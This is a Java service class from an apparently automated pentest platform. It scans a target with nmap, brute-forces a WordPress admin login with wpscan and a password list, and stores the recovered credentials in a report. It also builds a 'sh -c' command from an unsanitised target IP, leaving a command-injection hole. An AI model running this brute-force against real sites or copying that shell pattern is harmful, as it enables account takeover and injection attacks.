package org.penforge.backend.pentestScenarios;

import lombok.AllArgsConstructor;
import org.penforge.backend.pentestRecon.PentestReconService;
import org.penforge.backend.pentestReport.Credentials;
import org.penforge.backend.pentestReport.PentestReport;
import org.penforge.backend.pentestReport.PentestReportRepository;
import org.penforge.backend.pentestReport.PortData;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
@AllArgsConstructor
public class WPAttackService {

    private final PentestReconService pentestReconService;
    private final PentestReportRepository pentestReportRepository;

    public String isPortOpen(String targetIp, String userId) throws Exception {
        List<PortData> portDataList = pentestReconService.runNmap(targetIp);
        boolean isFtpPortOpen = portDataList.stream().anyMatch(portData -> portData.getPort().equals("80/tcp") && portData.getPortState().equals("open"));

        if (isFtpPortOpen) {
            return performWPAttack(targetIp, userId, portDataList);
        } else {
            throw new IllegalArgumentException("HTTP port is not open on target IP");
        }
    }

    public String performWPAttack(String targetIp, String userId, List<PortData> portDataList) {
        List<Credentials> credentialList = new ArrayList<>();
        boolean rootShellAccess = false;

        String passwordsPath = "/home/order6tyfix/passwords.txt";

        try {

            // 1. WPScan Kullanarak Brute-Force Attack
            String wpscanCommand = String.format("wpscan --url http://%s/secret/wp-login.php --usernames admin --passwords %s --force", targetIp, passwordsPath);
            String wpscanOutput = executeCommand(wpscanCommand);
            credentialList = extractCredentials(wpscanOutput);
            if (credentialList.isEmpty()) {
                System.out.println("No valid credentials found");
            }

            // Assume the first credential is valid for simplicity
            String username = credentialList.get(0).getUsername();
            String password = credentialList.get(0).getPassword();


        } catch (Exception e) {
            e.printStackTrace();
        }

        PentestReport report = PentestReport.builder()
                .userId(userId)
                .id(UUID.randomUUID().toString())
                .targetIP(targetIp)
                .targetService("http")
                .targetPort(80)
                .scanDate(new Date())
                .credentials(credentialList)
                .portData(portDataList)
                .rootShellAccess(rootShellAccess)
                .build();

        pentestReportRepository.save(report);

        return report.getId();
    }

    private List<Credentials> extractCredentials(String output) {
        List<Credentials> credentialList = new ArrayList<>();
        Pattern pattern = Pattern.compile("\\| Username: (\\S+), Password: (\\S+)");
        Matcher matcher = pattern.matcher(output);

        while (matcher.find()) {
            credentialList.add(Credentials.builder()
                    .username(matcher.group(1))
                    .password(matcher.group(2))
                    .credentialsFor("WordPress")
                    .build());
        }
        return credentialList;
    }



    private String executeCommand(String command) throws Exception {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("wsl", "-e", "sh", "-c", command);

        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        int exitCode = process.waitFor();
        if (exitCode != 0) {
            throw new RuntimeException("Command execution failed: " + command);
        }

        return output.toString();
    }



}
